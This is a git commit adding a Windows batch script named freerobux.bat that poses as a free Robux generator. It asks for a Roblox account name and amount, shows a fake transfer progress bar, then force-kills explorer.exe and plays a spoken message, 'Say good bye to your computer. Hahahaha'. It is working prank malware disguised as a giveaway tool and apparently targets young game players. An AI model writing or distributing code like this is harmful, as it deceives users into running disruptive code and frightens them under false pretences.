331c0a9872d9083a06a4368f9747531d0c593565
tommysprograms <tommypane2011@gmail.com>
2024-12-30 14:52:39 +0100

    Add files via upload

---
+++ freerobux.bat
@@ -0,0 +1,89 @@
+@echo off
+CHCP 65001 >nul
+@MODE CON COLS=54 LINES=30
+:menu
+color 0a
+title Free Robux Downloader!
+echo.
+echo      ███████   ██████   ███████   ███████       
+echo      ██        ██   ██  ██        ██            
+echo      █████     ██████   █████     █████        
+echo      ██        ██   ██  ██        ██            
+echo      ██        ██   ██  ███████   ███████       
+echo.
+echo.                                          
+echo.                                          
+echo  ██████    ██████    ██████    ██   ██  ██   ██ 
+echo  ██   ██  ██     ██  ██   ██   ██   ██   ██ ██  
+echo  ██████  ██       ██ ██████    ██   ██    ███   
+echo  ██   ██  ██     ██  ██   ██   ██   ██   ██ ██  
+echo  ██   ██   ██████    ██████    ██████   ██   ██ 
+echo.
+echo - A : ADD AMOUNT TO YOUR ACCOUNT
+echo - B : EXIT
+choice /C AB /CS /N /M "Enter A or B: "
+if %errorlevel%==1 goto add
+if %errorlevel%==2 goto exit
+
+:exit
+exit
+
+:add
+@MODE CON COLS=50 LINES=30
+CLS
+set /p aaaName=Enter Your Account Name: 
+set /p aaa=Enter Amount To Add: 
+timeout 1 >nul
+CLS
+echo GETTING ACCOUNT...
+timeout 1 >nul
+echo STARTING TRANSFER...
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║████                 ║
+echo ╚═════════════════════╝
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║█████████████        ║
+echo ╚═════════════════════╝
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║█████████████████████║
+echo ╚═════════════════════╝
+timeout 1 >nul
+CLS
+echo Transfering is complete! Enjoy your robux!
+timeout 1 >nul
+CLS 
+echo or will you?
+taskkill /f /im "explorer.exe" >nul
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=Say good bye to your computer. Hahahaha"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+del speech.Vbs
+:: start explorer
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
+                                          
